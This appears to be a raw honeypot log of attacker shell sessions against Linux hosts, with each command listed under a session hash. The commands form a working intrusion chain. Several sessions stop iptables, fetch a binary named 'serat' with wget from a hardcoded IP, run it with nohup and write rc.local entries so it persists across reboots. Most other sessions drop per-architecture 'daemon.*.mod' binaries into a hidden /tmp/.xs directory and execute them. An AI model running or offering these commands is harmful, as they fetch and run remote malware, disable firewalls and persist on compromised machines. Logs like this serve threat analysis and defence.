5c43106716ed4e32a0a57689bf9ea976	chmod 0777 serat
5c43106716ed4e32a0a57689bf9ea976	chmod u+x serat
5c43106716ed4e32a0a57689bf9ea976	./serat &
5c43106716ed4e32a0a57689bf9ea976	chmod u+x dos6cc4
5c43106716ed4e32a0a57689bf9ea976	./serat &
5c43106716ed4e32a0a57689bf9ea976	cd /tmp
5c43106716ed4e32a0a57689bf9ea976	echo "cd  /root/" >  > /etc/rc.local
5c43106716ed4e32a0a57689bf9ea976	echo "./serat&" >  > /etc/rc.local
5c43106716ed4e32a0a57689bf9ea976	echo "./serat&" >  > /etc/rc.local
5c43106716ed4e32a0a57689bf9ea976	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
66f734fe0b2447a7b8877243e7eb44cc	service iptables stop
66f734fe0b2447a7b8877243e7eb44cc	wget http://155.94.148.142:8080/serat
66f734fe0b2447a7b8877243e7eb44cc	nohup /root/serat  >  /dev/null 2 > &1 &
66f734fe0b2447a7b8877243e7eb44cc	chmod 777 serat
66f734fe0b2447a7b8877243e7eb44cc	./serat
66f734fe0b2447a7b8877243e7eb44cc	chmod 0755 /root/serat
66f734fe0b2447a7b8877243e7eb44cc	nohup /root/serat &gt
66f734fe0b2447a7b8877243e7eb44cc	/dev/null 2&gt
66f734fe0b2447a7b8877243e7eb44cc	&amp
66f734fe0b2447a7b8877243e7eb44cc	1 &amp
66f734fe0b2447a7b8877243e7eb44cc	chmod 0777 serat
66f734fe0b2447a7b8877243e7eb44cc	chmod u+x serat
66f734fe0b2447a7b8877243e7eb44cc	./serat &
66f734fe0b2447a7b8877243e7eb44cc	chmod u+x serat
66f734fe0b2447a7b8877243e7eb44cc	./serat &
66f734fe0b2447a7b8877243e7eb44cc	cd /tmp
66f734fe0b2447a7b8877243e7eb44cc	service iptables stop
66f734fe0b2447a7b8877243e7eb44cc	wget http://155.94.148.142:8080/serat
66f734fe0b2447a7b8877243e7eb44cc	nohup /root/serat &gt
66f734fe0b2447a7b8877243e7eb44cc	/dev/null 2&gt
66f734fe0b2447a7b8877243e7eb44cc	&amp
66f734fe0b2447a7b8877243e7eb44cc	1 &amp
66f734fe0b2447a7b8877243e7eb44cc	chmod 0777 serat
66f734fe0b2447a7b8877243e7eb44cc	chmod u+x serat
66f734fe0b2447a7b8877243e7eb44cc	./serat &
66f734fe0b2447a7b8877243e7eb44cc	chmod u+x dos6cc4
66f734fe0b2447a7b8877243e7eb44cc	./serat &
66f734fe0b2447a7b8877243e7eb44cc	cd /tmp
66f734fe0b2447a7b8877243e7eb44cc	echo "cd  /root/" >  > /etc/rc.local
66f734fe0b2447a7b8877243e7eb44cc	echo "./serat&" >  > /etc/rc.local
66f734fe0b2447a7b8877243e7eb44cc	echo "./serat&" >  > /etc/rc.local
66f734fe0b2447a7b8877243e7eb44cc	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
d934442ab1f040638c9072dc6ea94907	mkdir /tmp/.xs/
d934442ab1f040638c9072dc6ea94907	cat  > /tmp/.xs/daemon.armv4l.mod
d934442ab1f040638c9072dc6ea94907	chmod 777 /tmp/.xs/daemon.armv4l.mod
d934442ab1f040638c9072dc6ea94907	/tmp/.xs/daemon.armv4l.mod
2a299b58a433425a982b005adde616cd	mkdir /tmp/.xs/
2a299b58a433425a982b005adde616cd	cat  > /tmp/.xs/daemon.i686.mod
2a299b58a433425a982b005adde616cd	chmod 777 /tmp/.xs/daemon.i686.mod
2a299b58a433425a982b005adde616cd	/tmp/.xs/daemon.i686.mod
84b8afa397af4f1ab3650fc00d4ec573	mkdir /tmp/.xs/
84b8afa397af4f1ab3650fc00d4ec573	cat  > /tmp/.xs/daemon.mips.mod
84b8afa397af4f1ab3650fc00d4ec573	chmod 777 /tmp/.xs/daemon.mips.mod
84b8afa397af4f1ab3650fc00d4ec573	/tmp/.xs/daemon.mips.mod
836b99c0ef6f4ff58e647e8c5d80da80	mkdir /tmp/.xs/
836b99c0ef6f4ff58e647e8c5d80da80	cat  > /tmp/.xs/daemon.mipsel.mod
836b99c0ef6f4ff58e647e8c5d80da80	chmod 777 /tmp/.xs/daemon.mipsel.mod
836b99c0ef6f4ff58e647e8c5d80da80	/tmp/.xs/daemon.mipsel.mod
f85cc4520eb64e47835f2f0bd02d458a	mkdir /tmp/.xs/
f85cc4520eb64e47835f2f0bd02d458a	cat  > /tmp/.xs/test.mod
f85cc4520eb64e47835f2f0bd02d458a	chmod 777 /tmp/.xs/test.mod
f85cc4520eb64e47835f2f0bd02d458a	/tmp/.xs/test.mod
eef730e7572e425db49015a75f64321a	mkdir /tmp/.xs/
eef730e7572e425db49015a75f64321a	cat  > /tmp/.xs/daemon.armv4l.mod
eef730e7572e425db49015a75f64321a	chmod 777 /tmp/.xs/daemon.armv4l.mod
eef730e7572e425db49015a75f64321a	/tmp/.xs/daemon.armv4l.mod
6b12704df56d47b9a7428cda6a090660	mkdir /tmp/.xs/
6b12704df56d47b9a7428cda6a090660	cat  > /tmp/.xs/daemon.i686.mod
6b12704df56d47b9a7428cda6a090660	chmod 777 /tmp/.xs/daemon.i686.mod
6b12704df56d47b9a7428cda6a090660	/tmp/.xs/daemon.i686.mod
66e60b90de5e40f9b38d8a4e663700c4	mkdir /tmp/.xs/
66e60b90de5e40f9b38d8a4e663700c4	cat  > /tmp/.xs/daemon.mips.mod
66e60b90de5e40f9b38d8a4e663700c4	chmod 777 /tmp/.xs/daemon.mips.mod
66e60b90de5e40f9b38d8a4e663700c4	/tmp/.xs/daemon.mips.mod
46db8c1d1ebd4fc09d607f6b63a9301d	mkdir /tmp/.xs/
46db8c1d1ebd4fc09d607f6b63a9301d	cat  > /tmp/.xs/daemon.mipsel.mod
46db8c1d1ebd4fc09d607f6b63a9301d	chmod 777 /tmp/.xs/daemon.mipsel.mod
46db8c1d1ebd4fc09d607f6b63a9301d	/tmp/.xs/daemon.mipsel.mod
57748524d1304d9491456e0ed1fb7d5f	mkdir /tmp/.xs/
57748524d1304d9491456e0ed1fb7d5f	cat  > /tmp/.xs/daemon.armv4l.mod
57748524d1304d9491456e0ed1fb7d5f	chmod 777 /tmp/.xs/daemon.armv4l.mod
57748524d1304d9491456e0ed1fb7d5f	/tmp/.xs/daemon.armv4l.mod
c44a89a6b837436bb372b4b3e34c599b	mkdir /tmp/.xs/
c44a89a6b837436bb372b4b3e34c599b	cat  > /tmp/.xs/daemon.i686.mod
c44a89a6b837436bb372b4b3e34c599b	chmod 777 /tmp/.xs/daemon.i686.mod
c44a89a6b837436bb372b4b3e34c599b	/tmp/.xs/daemon.i686.mod
89a3bcc07c134205a9df237688644dd7	mkdir /tmp/.xs/
89a3bcc07c134205a9df237688644dd7	cat  > /tmp/.xs/daemon.mips.mod
89a3bcc07c134205a9df237688644dd7	chmod 777 /tmp/.xs/daemon.mips.mod
89a3bcc07c134205a9df237688644dd7	/tmp/.xs/daemon.mips.mod
1c125d9c9ef94693b1665ef3db1bbfbd	mkdir /tmp/.xs/
1c125d9c9ef94693b1665ef3db1bbfbd	cat  > /tmp/.xs/daemon.mipsel.mod
1c125d9c9ef94693b1665ef3db1bbfbd	chmod 777 /tmp/.xs/daemon.mipsel.mod
1c125d9c9ef94693b1665ef3db1bbfbd	/tmp/.xs/daemon.mipsel.mod
371f84389c04476a91c335312844e9d4	mkdir /tmp/.xs/
371f84389c04476a91c335312844e9d4	cat  > /tmp/.xs/test.mod
371f84389c04476a91c335312844e9d4	chmod 777 /tmp/.xs/test.mod
371f84389c04476a91c335312844e9d4	/tmp/.xs/test.mod
8c1490f8e02a49afac48e0733b610ed0	mkdir /tmp/.xs/
8c1490f8e02a49afac48e0733b610ed0	cat  > /tmp/.xs/daemon.armv4l.mod
8c1490f8e02a49afac48e0733b610ed0	chmod 777 /tmp/.xs/daemon.armv4l.mod
8c1490f8e02a49afac48e0733b610ed0	/tmp/.xs/daemon.armv4l.mod
fcf42e94483b4370b796eef7ff833461	mkdir /tmp/.xs/
fcf42e94483b4370b796eef7ff833461	cat  > /tmp/.xs/daemon.i686.mod
fcf42e94483b4370b796eef7ff833461	chmod 777 /tmp/.xs/daemon.i686.mod
fcf42e94483b4370b796eef7ff833461	/tmp/.xs/daemon.i686.mod
ebabd43ec4c8404dad87ff72d2cbba73	mkdir /tmp/.xs/
ebabd43ec4c8404dad87ff72d2cbba73	cat  > /tmp/.xs/daemon.mips.mod
ebabd43ec4c8404dad87ff72d2cbba73	chmod 777 /tmp/.xs/daemon.mips.mod
ebabd43ec4c8404dad87ff72d2cbba73	/tmp/.xs/daemon.mips.mod
de978793bf4a46bd8e988dd61b255463	mkdir /tmp/.xs/
de978793bf4a46bd8e988dd61b255463	cat  > /tmp/.xs/daemon.mipsel.mod
de978793bf4a46bd8e988dd61b255463	chmod 777 /tmp/.xs/daemon.mipsel.mod
de978793bf4a46bd8e988dd61b255463	/tmp/.xs/daemon.mipsel.mod
7019dd646a344d4ab4195c10fa67a141	mkdir /tmp/.xs/
7019dd646a344d4ab4195c10fa67a141	cat  > /tmp/.xs/daemon.armv4l.mod
7019dd646a344d4ab4195c10fa67a141	chmod 777 /tmp/.xs/daemon.armv4l.mod
7019dd646a344d4ab4195c10fa67a141	/tmp/.xs/daemon.armv4l.mod
7fdfdfcac32f42ef94bb8579e6e7aff5	mkdir /tmp/.xs/
7fdfdfcac32f42ef94bb8579e6e7aff5	cat  > /tmp/.xs/daemon.i686.mod
7fdfdfcac32f42ef94bb8579e6e7aff5	chmod 777 /tmp/.xs/daemon.i686.mod
7fdfdfcac32f42ef94bb8579e6e7aff5	/tmp/.xs/daemon.i686.mod
447f14ae815a4e0babfc39508d050ef5	mkdir /tmp/.xs/
447f14ae815a4e0babfc39508d050ef5	cat  > /tmp/.xs/daemon.mips.mod
447f14ae815a4e0babfc39508d050ef5	chmod 777 /tmp/.xs/daemon.mips.mod
447f14ae815a4e0babfc39508d050ef5	/tmp/.xs/daemon.mips.mod
d47463c6b1e34785b78f01d232a15a79	mkdir /tmp/.xs/
d47463c6b1e34785b78f01d232a15a79	cat  > /tmp/.xs/daemon.mipsel.mod
d47463c6b1e34785b78f01d232a15a79	chmod 777 /tmp/.xs/daemon.mipsel.mod
d47463c6b1e34785b78f01d232a15a79	/tmp/.xs/daemon.mipsel.mod
db95ee83d1e9419099faeeb7f57ee01c	mkdir /tmp/.xs/
db95ee83d1e9419099faeeb7f57ee01c	cat  > /tmp/.xs/test.mod
db95ee83d1e9419099faeeb7f57ee01c	chmod 777 /tmp/.xs/test.mod
db95ee83d1e9419099faeeb7f57ee01c	/tmp/.xs/test.mod
9380d73f7e484bb8b1ecd3ba6d6c7c02	mkdir /tmp/.xs/
9380d73f7e484bb8b1ecd3ba6d6c7c02	cat  > /tmp/.xs/daemon.armv4l.mod
9380d73f7e484bb8b1ecd3ba6d6c7c02	chmod 777 /tmp/.xs/daemon.armv4l.mod
9380d73f7e484bb8b1ecd3ba6d6c7c02	/tmp/.xs/daemon.armv4l.mod
c2fbeeb8d2064a9480c03892a7048be5	mkdir /tmp/.xs/
c2fbeeb8d2064a9480c03892a7048be5	cat  > /tmp/.xs/daemon.i686.mod
c2fbeeb8d2064a9480c03892a7048be5	chmod 777 /tmp/.xs/daemon.i686.mod
c2fbeeb8d2064a9480c03892a7048be5	/tmp/.xs/daemon.i686.mod
37ea4549597b4c4ebe66a2d67485b059	mkdir /tmp/.xs/
37ea4549597b4c4ebe66a2d67485b059	cat  > /tmp/.xs/daemon.mips.mod
37ea4549597b4c4ebe66a2d67485b059	chmod 777 /tmp/.xs/daemon.mips.mod
37ea4549597b4c4ebe66a2d67485b059	/tmp/.xs/daemon.mips.mod
ed38119921b0469ca49dc1336af617b3	mkdir /tmp/.xs/
ed38119921b0469ca49dc1336af617b3	cat  > /tmp/.xs/daemon.mipsel.mod
ed38119921b0469ca49dc1336af617b3	chmod 777 /tmp/.xs/daemon.mipsel.mod
ed38119921b0469ca49dc1336af617b3	/tmp/.xs/daemon.mipsel.mod
96a1233b61c84a1b90ec33e75b774ea5	mkdir /tmp/.xs/
96a1233b61c84a1b90ec33e75b774ea5	cat  > /tmp/.xs/daemon.armv4l.mod
96a1233b61c84a1b90ec33e75b774ea5	chmod 777 /tmp/.xs/daemon.armv4l.mod
96a1233b61c84a1b90ec33e75b774ea5	/tmp/.xs/daemon.armv4l.mod
68ff5db987ff4a8dae653bdec384d365	mkdir /tmp/.xs/
68ff5db987ff4a8dae653bdec384d365	cat  > /tmp/.xs/daemon.i686.mod
68ff5db987ff4a8dae653bdec384d365	chmod 777 /tmp/.xs/daemon.i686.mod
68ff5db987ff4a8dae653bdec384d365	/tmp/.xs/daemon.i686.mod
0534ef4d95f946c0829da9874640550e	mkdir /tmp/.xs/
0534ef4d95f946c0829da9874640550e	cat  > /tmp/.xs/daemon.mips.mod
0534ef4d95f946c0829da9874640550e	chmod 777 /tmp/.xs/daemon.mips.mod
0534ef4d95f946c0829da9874640550e	/tmp/.xs/daemon.mips.mod
eac06607afd6456cab4ac41349359d12	mkdir /tmp/.xs/
eac06607afd6456cab4ac41349359d12	cat  > /tmp/.xs/daemon.mipsel.mod
eac06607afd6456cab4ac41349359d12	chmod 777 /tmp/.xs/daemon.mipsel.mod
eac06607afd6456cab4ac41349359d12	/tmp/.xs/daemon.mipsel.mod
179fff9e0a564ca7b22ae9e9ac88e1b2	mkdir /tmp/.xs/
179fff9e0a564ca7b22ae9e9ac88e1b2	cat  > /tmp/.xs/daemon.armv4l.mod
179fff9e0a564ca7b22ae9e9ac88e1b2	chmod 777 /tmp/.xs/daemon.armv4l.mod
179fff9e0a564ca7b22ae9e9ac88e1b2	/tmp/.xs/daemon.armv4l.mod
a0d29cf01128496ba26b2050517678a4	mkdir /tmp/.xs/
a0d29cf01128496ba26b2050517678a4	cat  > /tmp/.xs/daemon.i686.mod
a0d29cf01128496ba26b2050517678a4	chmod 777 /tmp/.xs/daemon.i686.mod
a0d29cf01128496ba26b2050517678a4	/tmp/.xs/daemon.i686.mod
fa1eee90d263457f96aa609ba1385d28	mkdir /tmp/.xs/
fa1eee90d263457f96aa609ba1385d28	cat  > /tmp/.xs/daemon.mips.mod
fa1eee90d263457f96aa609ba1385d28	chmod 777 /tmp/.xs/daemon.mips.mod
fa1eee90d263457f96aa609ba1385d28	/tmp/.xs/daemon.mips.mod
2ee0c87abaa048cd917884c574d74078	mkdir /tmp/.xs/
2ee0c87abaa048cd917884c574d74078	cat  > /tmp/.xs/daemon.mipsel.mod
2ee0c87abaa048cd917884c574d74078	chmod 777 /tmp/.xs/daemon.mipsel.mod
2ee0c87abaa048cd917884c574d74078	/tmp/.xs/daemon.mipsel.mod
de2e03ebf2a6462aa95c8ebdfe621226	mkdir /tmp/.xs/
de2e03ebf2a6462aa95c8ebdfe621226	cat  > /tmp/.xs/daemon.armv4l.mod
de2e03ebf2a6462aa95c8ebdfe621226	chmod 777 /tmp/.xs/daemon.armv4l.mod
de2e03ebf2a6462aa95c8ebdfe621226	/tmp/.xs/daemon.armv4l.mod
b9309ee304e14c83961c2c42270aadef	mkdir /tmp/.xs/
b9309ee304e14c83961c2c42270aadef	cat  > /tmp/.xs/daemon.i686.mod
b9309ee304e14c83961c2c42270aadef	chmod 777 /tmp/.xs/daemon.i686.mod
b9309ee304e14c83961c2c42270aadef	/tmp/.xs/daemon.i686.mod
6c5d8933ea85406fa6c174b607af3c91	mkdir /tmp/.xs/
6c5d8933ea85406fa6c174b607af3c91	cat  > /tmp/.xs/daemon.mips.mod
6c5d8933ea85406fa6c174b607af3c91	chmod 777 /tmp/.xs/daemon.mips.mod
6c5d8933ea85406fa6c174b607af3c91	/tmp/.xs/daemon.mips.mod
65cd0e8eebaf42fea887a90d406f47c3	mkdir /tmp/.xs/
65cd0e8eebaf42fea887a90d406f47c3	cat  > /tmp/.xs/daemon.mipsel.mod
65cd0e8eebaf42fea887a90d406f47c3	chmod 777 /tmp/.xs/daemon.mipsel.mod
65cd0e8eebaf42fea887a90d406f47c3	/tmp/.xs/daemon.mipsel.mod
86f804c6d9d84b37ae5cd47058721677	mkdir /tmp/.xs/
86f804c6d9d84b37ae5cd47058721677	cat  > /tmp/.xs/daemon.armv4l.mod
86f804c6d9d84b37ae5cd47058721677	chmod 777 /tmp/.xs/daemon.armv4l.mod
86f804c6d9d84b37ae5cd47058721677	/tmp/.xs/daemon.armv4l.mod
8a32deb6f7c24af69ba543d9768f4696	mkdir /tmp/.xs/
8a32deb6f7c24af69ba543d9768f4696	cat  > /tmp/.xs/daemon.i686.mod
8a32deb6f7c24af69ba543d9768f4696	chmod 777 /tmp/.xs/daemon.i686.mod
8a32deb6f7c24af69ba543d9768f4696	/tmp/.xs/daemon.i686.mod
c0347236677a44e48a8a4104834f44ef	mkdir /tmp/.xs/
c0347236677a44e48a8a4104834f44ef	cat  > /tmp/.xs/daemon.mips.mod
c0347236677a44e48a8a4104834f44ef	chmod 777 /tmp/.xs/daemon.mips.mod
c0347236677a44e48a8a4104834f44ef	/tmp/.xs/daemon.mips.mod
a5a05458e81d41ffaf5b15c6479292cf	mkdir /tmp/.xs/
a5a05458e81d41ffaf5b15c6479292cf	cat  > /tmp/.xs/daemon.mipsel.mod
a5a05458e81d41ffaf5b15c6479292cf	chmod 777 /tmp/.xs/daemon.mipsel.mod
a5a05458e81d41ffaf5b15c6479292cf	/tmp/.xs/daemon.mipsel.mod
7f0cee17857f4f00a2421172c9aa90c6	mkdir /tmp/.xs/
7f0cee17857f4f00a2421172c9aa90c6	cat  > /tmp/.xs/daemon.armv4l.mod
7f0cee17857f4f00a2421172c9aa90c6	chmod 777 /tmp/.xs/daemon.armv4l.mod
7f0cee17857f4f00a2421172c9aa90c6	/tmp/.xs/daemon.armv4l.mod
e983dc5ece4b4935b44d1086dade7009	mkdir /tmp/.xs/
e983dc5ece4b4935b44d1086dade7009	cat  > /tmp/.xs/daemon.i686.mod
e983dc5ece4b4935b44d1086dade7009	chmod 777 /tmp/.xs/daemon.i686.mod
e983dc5ece4b4935b44d1086dade7009	/tmp/.xs/daemon.i686.mod
0d4223a2c6c74fd48e4d4890ea157782	mkdir /tmp/.xs/
0d4223a2c6c74fd48e4d4890ea157782	cat  > /tmp/.xs/daemon.mips.mod
0d4223a2c6c74fd48e4d4890ea157782	chmod 777 /tmp/.xs/daemon.mips.mod
0d4223a2c6c74fd48e4d4890ea157782	/tmp/.xs/daemon.mips.mod
6838f8bfe6614b18a7f9753930bf1b0b	mkdir /tmp/.xs/
6838f8bfe6614b18a7f9753930bf1b0b	cat  > /tmp/.xs/daemon.mipsel.mod
6838f8bfe6614b18a7f9753930bf1b0b	chmod 777 /tmp/.xs/daemon.mipsel.mod
6838f8bfe6614b18a7f9753930bf1b0b	/tmp/.xs/daemon.mipsel.mod
50b0c460255346cca2a96a3cad563e6e	mkdir /tmp/.xs/
50b0c460255346cca2a96a3cad563e6e	cat  > /tmp/.xs/daemon.armv4l.mod
50b0c460255346cca2a96a3cad563e6e	chmod 777 /tmp/.xs/daemon.armv4l.mod
50b0c460255346cca2a96a3cad563e6e	/tmp/.xs/daemon.armv4l.mod
cad6769238b845ce97b3388420c681fa	mkdir /tmp/.xs/
cad6769238b845ce97b3388420c681fa	cat  > /tmp/.xs/daemon.i686.mod
cad6769238b845ce97b3388420c681fa	chmod 777 /tmp/.xs/daemon.i686.mod
cad6769238b845ce97b3388420c681fa	/tmp/.xs/daemon.i686.mod
77032a58f43a48a687bd18c451383c3b	mkdir /tmp/.xs/
77032a58f43a48a687bd18c451383c3b	cat  > /tmp/.xs/daemon.mips.mod
77032a58f43a48a687bd18c451383c3b	chmod 777 /tmp/.xs/daemon.mips.mod
77032a58f43a48a687bd18c451383c3b	/tmp/.xs/daemon.mips.mod
862130a13e1048b8b9bcdf457eca3d94	mkdir /tmp/.xs/
862130a13e1048b8b9bcdf457eca3d94	cat  > /tmp/.xs/daemon.mipsel.mod
862130a13e1048b8b9bcdf457eca3d94	chmod 777 /tmp/.xs/daemon.mipsel.mod
862130a13e1048b8b9bcdf457eca3d94	/tmp/.xs/daemon.mipsel.mod
ac569585bcfb44dc88733d7806e7c9d1	mkdir /tmp/.xs/
ac569585bcfb44dc88733d7806e7c9d1	cat  > /tmp/.xs/daemon.armv4l.mod
ac569585bcfb44dc88733d7806e7c9d1	chmod 777 /tmp/.xs/daemon.armv4l.mod
ac569585bcfb44dc88733d7806e7c9d1	/tmp/.xs/daemon.armv4l.mod
dca51e9efb5a47109f97942f600aa0e9	mkdir /tmp/.xs/
dca51e9efb5a47109f97942f600aa0e9	cat  > /tmp/.xs/daemon.i686.mod
dca51e9efb5a47109f97942f600aa0e9	chmod 777 /tmp/.xs/daemon.i686.mod
dca51e9efb5a47109f97942f600aa0e9	/tmp/.xs/daemon.i686.mod
f8dcd4394bf64917b77b726419d71f3b	mkdir /tmp/.xs/
f8dcd4394bf64917b77b726419d71f3b	cat  > /tmp/.xs/daemon.mips.mod
f8dcd4394bf64917b77b726419d71f3b	chmod 777 /tmp/.xs/daemon.mips.mod
f8dcd4394bf64917b77b726419d71f3b	/tmp/.xs/daemon.mips.mod
a05b81ccd0aa43698e0087e8e47ee3a9	mkdir /tmp/.xs/
a05b81ccd0aa43698e0087e8e47ee3a9	cat  > /tmp/.xs/daemon.mipsel.mod
a05b81ccd0aa43698e0087e8e47ee3a9	chmod 777 /tmp/.xs/daemon.mipsel.mod
a05b81ccd0aa43698e0087e8e47ee3a9	/tmp/.xs/daemon.mipsel.mod
0497de33c1cb4498a0e85d23f194fb27	mkdir /tmp/.xs/
0497de33c1cb4498a0e85d23f194fb27	cat  > /tmp/.xs/daemon.armv4l.mod
0497de33c1cb4498a0e85d23f194fb27	chmod 777 /tmp/.xs/daemon.armv4l.mod
0497de33c1cb4498a0e85d23f194fb27	/tmp/.xs/daemon.armv4l.mod
b448c256858a47038771fbe15228805b	mkdir /tmp/.xs/
b448c256858a47038771fbe15228805b	cat  > /tmp/.xs/daemon.i686.mod
b448c256858a47038771fbe15228805b	chmod 777 /tmp/.xs/daemon.i686.mod
b448c256858a47038771fbe15228805b	/tmp/.xs/daemon.i686.mod
688910047a6a43ffa04bb05a4d2125e9	mkdir /tmp/.xs/
688910047a6a43ffa04bb05a4d2125e9	cat  > /tmp/.xs/daemon.mips.mod
688910047a6a43ffa04bb05a4d2125e9	chmod 777 /tmp/.xs/daemon.mips.mod
688910047a6a43ffa04bb05a4d2125e9	/tmp/.xs/daemon.mips.mod
8ccda1b4f44c4524a7e18ce3b902bc95	mkdir /tmp/.xs/
8ccda1b4f44c4524a7e18ce3b902bc95	cat  > /tmp/.xs/daemon.mipsel.mod
8ccda1b4f44c4524a7e18ce3b902bc95	chmod 777 /tmp/.xs/daemon.mipsel.mod
8ccda1b4f44c4524a7e18ce3b902bc95	/tmp/.xs/daemon.mipsel.mod
6de8186e53cd4536bb48809203630684	echo -n test
6de8186e53cd4536bb48809203630684	cat /proc/version
6d5c13de09434f43ba2ae13eb1732f28	mkdir /tmp/.xs/
6d5c13de09434f43ba2ae13eb1732f28	cat  > /tmp/.xs/daemon.armv4l.mod
6d5c13de09434f43ba2ae13eb1732f28	chmod 777 /tmp/.xs/daemon.armv4l.mod
6d5c13de09434f43ba2ae13eb1732f28	/tmp/.xs/daemon.armv4l.mod
97c52bc7ad084cd4872a8aa855824d07	mkdir /tmp/.xs/
97c52bc7ad084cd4872a8aa855824d07	cat  > /tmp/.xs/daemon.i686.mod
97c52bc7ad084cd4872a8aa855824d07	chmod 777 /tmp/.xs/daemon.i686.mod
97c52bc7ad084cd4872a8aa855824d07	/tmp/.xs/daemon.i686.mod
ed9da5dc969d4faeb86ab3798375d01c	mkdir /tmp/.xs/
ed9da5dc969d4faeb86ab3798375d01c	cat  > /tmp/.xs/daemon.mips.mod
ed9da5dc969d4faeb86ab3798375d01c	chmod 777 /tmp/.xs/daemon.mips.mod
ed9da5dc969d4faeb86ab3798375d01c	/tmp/.xs/daemon.mips.mod
742076dbc2034522831f5071a874f01a	mkdir /tmp/.xs/
742076dbc2034522831f5071a874f01a	cat  > /tmp/.xs/daemon.mipsel.mod
742076dbc2034522831f5071a874f01a	chmod 777 /tmp/.xs/daemon.mipsel.mod
742076dbc2034522831f5071a874f01a	/tmp/.xs/daemon.mipsel.mod
bfe0c379515e4a9694fae238feb6e241	mkdir /tmp/.xs/
bfe0c379515e4a9694fae238feb6e241	cat  > /tmp/.xs/daemon.armv4l.mod
bfe0c379515e4a9694fae238feb6e241	chmod 777 /tmp/.xs/daemon.armv4l.mod
bfe0c379515e4a9694fae238feb6e241	/tmp/.xs/daemon.armv4l.mod
c80384fb32ef48eeabfc5fd425d89004	mkdir /tmp/.xs/
c80384fb32ef48eeabfc5fd425d89004	cat  > /tmp/.xs/daemon.i686.mod
c80384fb32ef48eeabfc5fd425d89004	chmod 777 /tmp/.xs/daemon.i686.mod
c80384fb32ef48eeabfc5fd425d89004	/tmp/.xs/daemon.i686.mod
85b572a7c1934d828ba89db8ad04e224	mkdir /tmp/.xs/
85b572a7c1934d828ba89db8ad04e224	cat  > /tmp/.xs/daemon.mips.mod
85b572a7c1934d828ba89db8ad04e224	chmod 777 /tmp/.xs/daemon.mips.mod
85b572a7c1934d828ba89db8ad04e224	/tmp/.xs/daemon.mips.mod
40d13860a1414e8f8bf91ba4fd2fd48a	mkdir /tmp/.xs/
40d13860a1414e8f8bf91ba4fd2fd48a	cat  > /tmp/.xs/daemon.mipsel.mod
40d13860a1414e8f8bf91ba4fd2fd48a	chmod 777 /tmp/.xs/daemon.mipsel.mod
40d13860a1414e8f8bf91ba4fd2fd48a	/tmp/.xs/daemon.mipsel.mod
30139764ddcd4a0aa45b465bce17bfb1	mkdir /tmp/.xs/
30139764ddcd4a0aa45b465bce17bfb1	cat  > /tmp/.xs/daemon.armv4l.mod
30139764ddcd4a0aa45b465bce17bfb1	chmod 777 /tmp/.xs/daemon.armv4l.mod
30139764ddcd4a0aa45b465bce17bfb1	/tmp/.xs/daemon.armv4l.mod
26fcd0e9eb6b495b9f00df3ae252373c	mkdir /tmp/.xs/
26fcd0e9eb6b495b9f00df3ae252373c	cat  > /tmp/.xs/daemon.i686.mod
26fcd0e9eb6b495b9f00df3ae252373c	chmod 777 /tmp/.xs/daemon.i686.mod
26fcd0e9eb6b495b9f00df3ae252373c	/tmp/.xs/daemon.i686.mod
112ccddb2f074c60bc68e5e606378437	mkdir /tmp/.xs/
112ccddb2f074c60bc68e5e606378437	cat  > /tmp/.xs/daemon.mips.mod
112ccddb2f074c60bc68e5e606378437	chmod 777 /tmp/.xs/daemon.mips.mod
112ccddb2f074c60bc68e5e606378437	/tmp/.xs/daemon.mips.mod
24a7929444c14cb984f3e4e84f14f55e	mkdir /tmp/.xs/
24a7929444c14cb984f3e4e84f14f55e	cat  > /tmp/.xs/daemon.mipsel.mod
24a7929444c14cb984f3e4e84f14f55e	chmod 777 /tmp/.xs/daemon.mipsel.mod
24a7929444c14cb984f3e4e84f14f55e	/tmp/.xs/daemon.mipsel.mod
805647ddb1534043b78bf4614f12f2ed	mkdir /tmp/.xs/
805647ddb1534043b78bf4614f12f2ed	cat  > /tmp/.xs/daemon.armv4l.mod
805647ddb1534043b78bf4614f12f2ed	chmod 777 /tmp/.xs/daemon.armv4l.mod
805647ddb1534043b78bf4614f12f2ed	/tmp/.xs/daemon.armv4l.mod
307ab5a892654f4ca75043295e73a394	mkdir /tmp/.xs/
307ab5a892654f4ca75043295e73a394	cat  > /tmp/.xs/daemon.i686.mod
307ab5a892654f4ca75043295e73a394	chmod 777 /tmp/.xs/daemon.i686.mod
307ab5a892654f4ca75043295e73a394	/tmp/.xs/daemon.i686.mod
db01b5207d6e4a1ea273b4772e3c6266	mkdir /tmp/.xs/
